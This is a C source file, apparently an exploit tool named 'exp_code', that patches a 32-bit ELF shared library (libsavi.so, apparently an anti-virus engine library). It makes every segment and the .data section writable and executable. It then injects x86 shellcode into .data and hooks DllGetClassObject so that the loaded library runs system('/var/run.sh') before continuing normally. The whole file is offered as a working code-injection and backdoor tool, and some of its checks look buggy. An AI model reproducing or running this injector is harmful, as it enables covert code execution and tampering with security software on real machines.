#include <stdio.h>
#include <elf.h>
#include <assert.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdbool.h>

unsigned char shellcode1[] ={
    0xE9,0x11,0x22,0x33,0x44, // jmp 0x11223344(placeholder)
    0x90,0x90 //nop,nop (patch the space)
};
unsigned char shellcode2[] = {
    0x69,0x6E,0x73,0x65,0x72,0x74,0x65,0x64,0x00, //inserted flag 8
    0x55,0x57,0x56,0x53, // push ebp,edi,esi,ebx; 12
    0x83,0xEC,0x0C, // sub esp,0xc 15
    0x50,0x51,0x52, // push eax,ecx,edx 18

    0xE8,0x00,0x00,0x00,0x00, // get cur+5 address 23
    0x59, // pop ecx, store current address in ecx 24
    0x8D,0x99,0x11,0x22,0x33,0x44, // lea ebx,[ecx+11223344] (ebx stores got table address) 30
    0x83,0xEC,0x08, // sub esp,0x8 33
    0x6A,0x1, //push 1 35
    0x8D,0xB9,0x11,0x22,0x33,0x44, //lea edi,[ecx+11223344] (path of libc) 41
    0x57, //push edi 42
    0xE8,0x11,0x22,0x33,0x44, // call dlopen 47
    0x83,0xC4,0x10, // add esp,0x10 50

    0xE8,0x00,0x00,0x00,0x00, // get cur+5 address 55
    0x59, // pop ecx, store current address in ecx 56
    0x83,0xEC,0x08, //sub esp,0x8 59
    0x8D,0xB9,0x11,0x22,0x33,0x44, //lea edi,[ecx+11223344] (name of target function-system) 65
    0x57,0x50, //push edi,push eax 67
    0xE8,0x11,0x22,0x33,0x44, //call dlsym 72
    0x83,0xC4,0x10, // add esp,0x10 75

    0xE8,0x00,0x00,0x00,0x00, // get cur+5 address 80
    0x59, // pop ecx, store current address in ecx 81
    0x83,0xEC,0x0C, //sub esp,0xC 84
    0x8D,0xB9,0x11,0x22,0x33,0x44, //lea edi,[ecx+11223344] (parameter of system) 90
    0x57, //push edi 91
    0xFF,0xD0, // call eax (call system) 93
    0x83,0xC4,0x10, //add esp,0x10 96

    0x5A,0x59,0x58, //pop edx,ecx,eax 99
    0xE9,0x11,0x22,0x33,0x44, //jmp 0x11223344 104
    0x2F,0x6C,0x69,0x62,0x2F,0x6C,0x69,0x62,0x63,0x2D,0x32,0x2E,0x32,0x37,0x2E,0x73,0x6F,0x00, // /lib/libc-2.27.so 122
    0x73,0x79,0x73,0x74,0x65,0x6D, 0x00,// system 129
    0x2F,0x76,0x61,0x72,0x2F,0x72,0x75,0x6E,0x2E,0x73,0x68,0x00 // /var/run.sh 140
};

void read_elf_header(FILE* fd, Elf32_Ehdr *eh)
{
    assert(eh != NULL);
    assert(fseek(fd, 0, SEEK_SET) == 0);
    assert(fread((void*)eh, sizeof(Elf32_Ehdr),1,fd) == 1 );
    printf("Read ELF header successfully\n");
}

void read_section_header(FILE* fd, Elf32_Shdr *sh_table, Elf32_Ehdr *eh)
{
    assert(sh_table != NULL);
    assert(fseek(fd,eh->e_shoff,SEEK_SET) == 0);
    assert(fread(sh_table,sizeof(Elf32_Shdr),eh->e_shnum,fd) == eh->e_shnum);
    printf("Read section header successfully\n");
}

void read_program_header(FILE* fd, Elf32_Phdr *ph_table, Elf32_Ehdr *eh)
{
    assert(ph_table != NULL);
    assert(fseek(fd,eh->e_phoff,SEEK_SET) == 0);
    assert(fread(ph_table,sizeof(Elf32_Phdr),eh->e_phnum,fd) == eh->e_phnum);
    printf("Read program header successfully\n");
}

void read_dynsym_data(FILE* fd, Elf32_Sym *sym_table, uint32_t sym_off, uint32_t sym_size)
{
    assert(sym_table != NULL);
    assert(fseek(fd,sym_off,SEEK_SET) == 0);
    assert(fread(sym_table,sym_size,1,fd) == 1);
    printf("Read .dynsym setion data successfully\n");
}

void read_relplt_data(FILE* fd, Elf32_Rel *rel_table, uint32_t rplt_off, uint32_t rplt_size)
{
    assert(rel_table != NULL);
    assert(fseek(fd,rplt_off,SEEK_SET) == 0);
    assert(fread(rel_table,rplt_size,1,fd) == 1);
    printf("Read .rel.plt section data successfully\n");
}

bool is_ELF(Elf32_Ehdr *en)
{
    if(strncmp((char*)en->e_ident, "/177ELF",4))
    {
        printf("FIle is ELF\n");
        return 1;
    }
    printf("Not ELF\n");
    return 0;
}

void usage()
{
    printf("usage:\n");
    printf("./exp_code /path/to/libsavi.so\n");
    exit(0);
}

int main(int argc,char *argv[])
{
    if(argc != 2) usage();
    FILE* fd = fopen(argv[1],"r+");
    
    if(fd<0){
        printf("Error %d Unable to open %s\n",fd,argv[1]);
        return 0;
    }

    // read ELF header
    Elf32_Ehdr *eh =(Elf32_Ehdr*)malloc(sizeof(Elf32_Ehdr));
    read_elf_header(fd, eh);
    if(!is_ELF(eh)) return 0;

    // read section header
    printf("ELF has %d Sections, now reading section header from 0x%x\n",eh->e_shnum,eh->e_shoff);
    Elf32_Shdr *sh_table = (Elf32_Shdr*)malloc(sizeof(Elf32_Shdr) * eh->e_shnum);
    read_section_header(fd, sh_table, eh);
    

    printf("now get .shstrtab section offset \n");
    // get .shstrtab data address
    uint32_t shstr_off = sh_table[eh->e_shstrndx].sh_offset;
    fseek(fd,shstr_off,SEEK_SET);
    char* pstr = fd->_IO_read_ptr;
    printf(".shstrtab data begin on 0x%x\n",*pstr);
    
    // get some necessary section information
    int i = 0;
    int br = 0;
    uint32_t privi = 0x7;
    uint32_t data_addr = 0, data_off = 0, data_size = 0;
    uint32_t rplt_addr = 0, rplt_off = 0, rplt_size = 0, rplt_num = 0;
    uint32_t sym_addr = 0, sym_off = 0, sym_size = 0, sym_num = 0;
    uint32_t plt_addr = 0, plt_off = 0;
    uint32_t got_addr = 0, got_off = 0;
    uint32_t str_addr = 0, str_off = 0;
    Elf32_Sym *sym_table = NULL;
    Elf32_Rel *rel_table = NULL;

    for(i=0;i<eh->e_shnum;i++)
    {
        fseek(fd,shstr_off,SEEK_SET);
        if(!strcmp(pstr + sh_table[i].sh_name,".data")) 
        {
            // get .data virtual address and offset in file
            data_addr = sh_table[i].sh_addr;
            data_off = sh_table[i].sh_offset;
            data_size = sh_table[i].sh_size;
            printf(".data section virtual address is 0x%x, offset in file is 0x%x\n",data_addr,data_off);

            // change the privilege of .data
            fseek(fd,eh->e_shoff+(i*sizeof(Elf32_Shdr))+8,SEEK_SET);
            fwrite(&privi,sizeof(uint32_t),1,fd);
            printf("change the .data section privilege to 0x%x\n",*fd->_IO_read_ptr);
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".dynsym"))
        {
            // get symbol table address and size
            sym_addr = sh_table[i].sh_addr;
            sym_off = sh_table[i].sh_offset;
            sym_size = sh_table[i].sh_size;
            sym_num = sym_size/sizeof(Elf32_Sym);
            printf(".dynsym section virtual address is 0x%x, offset in file is 0x%x\n",sym_addr,sym_off);
            
            // read symbol data
            sym_table = (Elf32_Sym*)malloc(sym_size);
            read_dynsym_data(fd,sym_table,sym_off,sym_size);
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".rel.plt"))
        {
            rplt_addr = sh_table[i].sh_addr;
            rplt_off = sh_table[i].sh_offset;
            rplt_size = sh_table[i].sh_size;
            rplt_num = rplt_size/sizeof(Elf32_Rel);
            printf(".rel.plt section virtual address is 0x%x, offset in file is 0x%x\n",rplt_addr,rplt_off);
            
            // read rel.plt data
            rel_table = (Elf32_Rel*)malloc(rplt_size);
            read_relplt_data(fd,rel_table,rplt_off,rplt_size);
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".dynstr"))
        {
            // get .dynstr virtual address
            str_addr = sh_table[i].sh_addr;
            str_off = sh_table[i].sh_offset;
            printf(".dynstr section virtual address is 0x%x, offset in file is 0x%x\n",str_addr,str_off);
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".got"))
        {
            // get .got entry address
            got_addr = sh_table[i].sh_addr;
            got_off = sh_table[i].sh_offset;
            printf(".got section virtual address is 0x%x, offset in file is 0x%x\n",got_addr,got_off);
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".plt"))
        {
            // get .plt entry address
            plt_addr = sh_table[i].sh_addr;
            plt_off = sh_table[i].sh_offset;
            printf(".plt section entry address is 0x%x, offset in file is 0x%x\n",plt_addr,plt_off);
            br++;
        }
        if(br == 6) break;

    }

    // read program header
    Elf32_Phdr *ph_table = (Elf32_Phdr*)malloc(sizeof(Elf32_Phdr)*eh->e_phnum);
    read_program_header(fd,ph_table,eh);

    // change all the privilege of segment
    for(i=0;i<eh->e_phnum;i++)
    {
        fseek(fd,eh->e_phoff+(i*sizeof(Elf32_Phdr))+24,SEEK_SET);
        fwrite(&privi,sizeof(uint32_t),1,fd);
    }
    printf("change all segment privilege to 0x7\n");

    // if can't find "inserted", then find enough all-zero area for shellcode
    int j = 0, zero = 0, count_zero = 0;
    uintptr_t insert_caddr = 0, insert_waddr = 0;
    uint32_t iszero =1;
    char* tmp_str = malloc(sizeof("inserted"));

    fseek(fd,data_off,SEEK_CUR);
    for(j=0;j<data_size;j++)
    {
        fread(tmp_str,sizeof("inserted"),1,fd);
        if(!strcmp(tmp_str,"inserted")) 
        {
            printf("shellcode had been inserted");
            return 0; 
        }
        fseek(fd,data_off+j,SEEK_SET);
        fread(&iszero,1,1,fd);
        if(iszero == 0x0)
        {
            if(zero == 0)
            {
                zero =1;
                insert_caddr = data_addr+j+1; // for computing the RVA
                insert_waddr = data_off+j+1;  // for writing the shellcode to file
                // add 1 to avoid the last character '\0' of string
            }
            else if(zero == 1)
            {
                count_zero ++;
                if(count_zero >= sizeof(shellcode2)+sizeof(shellcode1))
                {
                    printf("find enugh space to inject the shellcode,the entry address is 0x%x\n",insert_caddr);
                    break;
                }
            }
        }
        else
        {
            zero = 0;
            count_zero = 0;
        }
    }
    if (j >= data_size)
    {
        printf("cant find enugh space for shellcode\n");
        return 0;
    }

    // get address of function DllGetClassObject, dlopen and dlsym
    int c=0;
    uint32_t dll_addr=0;
    for(c=0;c<sym_num;c++)
    {
        fseek(fd,str_off+sym_table[c].st_name,SEEK_SET);
        if(!strcmp(fd->_IO_read_ptr,"DllGetClassObject"))
        {
            dll_addr = sym_table[c].st_value;
            printf("DllGetClassObject function entry address is 0x%x\n",dll_addr);
            break;
        }  
    }
    if(c>=sym_num)
    {
        printf("cant find DllGetClassObject funtion\n");
        return 0;
    }

    
    int idx = 0;
    uint32_t dop_addr = 0, dsm_addr = 0;
    uint32_t rel_begin = rel_table[0].r_offset;
    int plt_idx_dop = 0, plt_idx_dsm=0;
    for(c=0,br=0;c<rplt_num;c++)
    {
        idx = rel_table[c].r_info>>8; // get index in .dynsym table
        fseek(fd,str_off+sym_table[idx].st_name,SEEK_SET);  
        if(!strcmp(fd->_IO_read_ptr,"dlopen"))
        {
            dop_addr = rel_table[c].r_offset;
            plt_idx_dop = (dop_addr - rel_begin)/4; 
            dop_addr = plt_addr + (plt_idx_dop+1)*0x10;
            printf("dlopen@plt address is 0x%x\n",dop_addr);
            br++;
        }
        else if(!strcmp(fd->_IO_read_ptr,"dlsym"))
        {
            dsm_addr = rel_table[c].r_offset;
            plt_idx_dsm = (dsm_addr - rel_begin)/4;
            dsm_addr = plt_addr + (plt_idx_dsm+1)*0x10;
            printf("dlsym@plt address is 0x%x\n",dsm_addr);
            br++;
        }
        if(br==2) break;
    }
    if(c>=rplt_num)
    {
        printf("cant find dlopen or dlsym funtion\n");
        return 0;
    }

    // compute the RVA
    uint32_t tmp_addr = 0;

    // compute the inserted address
    tmp_addr = insert_caddr+9 - dll_addr - 5;
    memcpy(shellcode1+1,&tmp_addr,sizeof(tmp_addr));
    printf("RVA of inserted address is 0x%x\n",tmp_addr);
    
    // compute got table entry address
    tmp_addr = got_addr - insert_caddr - 25 + 1;
    memcpy(shellcode2+27,&tmp_addr,sizeof(tmp_addr));
    printf("RVA of got address is 0x%x\n",tmp_addr);

    // compute the address of 'libc.so' 
    tmp_addr = 105 - 36 + 12;
    memcpy(shellcode2+38,&tmp_addr,sizeof(tmp_addr));
    printf("RVA of string 'libc.so' address is 0x%x\n",tmp_addr);

    // compute the entry address of dlopen function
    tmp_addr = dop_addr - insert_caddr - 43 - 5;
    memcpy(shellcode2+44,&tmp_addr,sizeof(tmp_addr));

    // compute the address of 'system'
    tmp_addr = 123 - 60 + 4;
    memcpy(shellcode2+62,&tmp_addr,sizeof(tmp_addr));
  
    // compute the entry address of dlsym function
    tmp_addr = dsm_addr - insert_caddr - 68 - 5;
    memcpy(shellcode2+69,&tmp_addr,sizeof(tmp_addr));

    // compute the address of '/var/run.sh' 
    tmp_addr = 129 - 85 + 5;
    memcpy(shellcode2+87,&tmp_addr,sizeof(tmp_addr));

    // compute the jump-back address
    tmp_addr = dll_addr + 7 - insert_caddr - 100 - 5;
    printf("%x\n",tmp_addr);
    memcpy(shellcode2+101,&tmp_addr,sizeof(tmp_addr));

    fseek(fd,dll_addr,SEEK_SET);
    fwrite(shellcode1,sizeof(shellcode1),1,fd);
    rewind(fd);
    fseek(fd,insert_waddr,SEEK_SET);
    fwrite(shellcode2,sizeof(shellcode2),1,fd);
    printf("shellcode inject successfully");
    fclose(fd); 
    return 0;
}   